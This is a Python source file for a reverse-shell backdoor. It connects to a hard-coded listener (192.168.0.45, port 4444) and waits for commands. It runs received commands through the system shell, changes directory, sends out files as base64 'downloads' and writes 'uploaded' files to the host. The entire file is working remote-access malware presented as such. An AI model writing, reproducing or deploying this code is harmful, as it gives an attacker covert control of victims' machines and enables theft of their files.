#!/usr/bin/env python

import socket, subprocess, json, os, base64

class Backdoor:
	def __init__(self, ip, port): # Constructor
		self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # socket object
		self.connection.connect((ip, port)) # connects socket to a destination ([targetIP],[targetPORT])

	def reliable_send(self, data): # encodes the sending message into JSON for serialization
		json_data = json.dumps(data) # encodes
		self.connection.send(json_data.encode()) # sends via encoded message through socket
		# encode() for byte-type encode for p3 compatibility
	
	def reliable_recv(self): # decodes the receiving message from JSON to plain text
		json_data = b"" # byte type object -string- (P3 comp)
		while True:
			try: # if the data is higher that buffer size, iterates
				json_data = json_data + self.connection.recv(1024) # recieves encoded message
				return json.loads(json_data) # decode message
			except ValueError:
				continue
	
	def execute_system_commands(self, command): # Method to exec a command and return result
		return subprocess.check_output(command, shell=True)

	def change_dir(self, path): # Method to change working directory
		os.chdir(path) # os module to cross-platform
		return "[+] Changed working directory to " + path

	def read_file(self, path): # Method to read file content 
		with open(path, "rb") as file: # open and read binary
			return base64.b64encode(file.read()) # encodes file content in Base64
	
	def write_file(self, path, content): # Method to write binary content into a file
		with open(path, "wb") as file: # write binary
			file.write(base64.b64decode(content)) # decode from Base64
			return "[+] Upload successful."
		
	def run(self):
		while True:
			command = self.reliable_recv() # receives a command

			try:
				if command[0] == "stop": 
					self.connection.close() # close socket
					exit() # stops program
				
				elif command[0] == 'cd' and len(command) > 1: 	# change dir
					command_result = self.change_dir(command[1]) 
				
				elif command[0] == 'download': # decode() for p3 compatibility
					command_result = self.read_file(command[1]).decode() # return file content
				
				elif command[0] == 'upload': # parse file path and content to upload file to client
					command_result = self.write_file(command[1], command[2]) 
					
				else: # executes. Decode() for p3 compatibility
					command_result = self.execute_system_commands(command).decode() 
					
			except Exception:
				command_result = "[-] Error during command execution."
		
			self.reliable_send(command_result) # returns the command output

my_backdoor = Backdoor("192.168.0.45", 4444) # listener's IP and port
my_backdoor.run()
